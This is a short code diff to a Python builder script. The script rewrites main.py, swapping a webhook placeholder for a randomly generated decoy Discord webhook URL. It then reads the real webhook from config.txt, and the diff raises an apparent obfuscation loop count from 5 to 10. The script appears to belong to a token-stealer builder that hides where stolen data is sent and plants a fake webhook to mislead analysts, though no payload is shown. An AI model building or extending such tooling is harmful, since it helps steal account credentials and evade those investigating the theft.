@@ -1,7 +1,7 @@
 import base64, codecs, string, random
 with open("main.py", encoding="utf-8") as file:
     code = file.read().replace('WEBHOOK = "Do NOT Enter anything here! Enter your webhook in config.txt"', f"WEBHOOK = \"https://discord.com/api/webhooks/{''.join(random.choices(string.digits, k= 18))}/{''.join(random.choices(string.ascii_letters + string.digits, k= 68))}\"")
-n = 5
+n = 10
 with open("config.txt") as config:
     hook = config.read()
 for j in range(n):
